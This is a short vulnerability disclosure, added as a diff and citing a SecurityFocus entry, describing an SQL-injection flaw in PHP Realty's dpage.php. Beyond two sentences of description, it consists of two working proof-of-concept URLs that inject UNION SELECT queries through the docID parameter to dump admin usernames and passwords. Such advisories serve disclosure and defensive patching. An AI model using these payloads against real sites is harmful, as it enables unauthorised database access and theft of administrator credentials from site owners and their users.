@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/30678/info
+
+PHP Realty is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+http://www.example.com/path/dpage.php?docID=-1 UNION SELECT 1,2,concat(Username,0x3a,Password) FROM admin--
+http://www.example.com/path/dpage.php?docID=-9999+union+all+select+1,2,group_concat(Username,char(58),Password)v3n0m+from+admin-- 
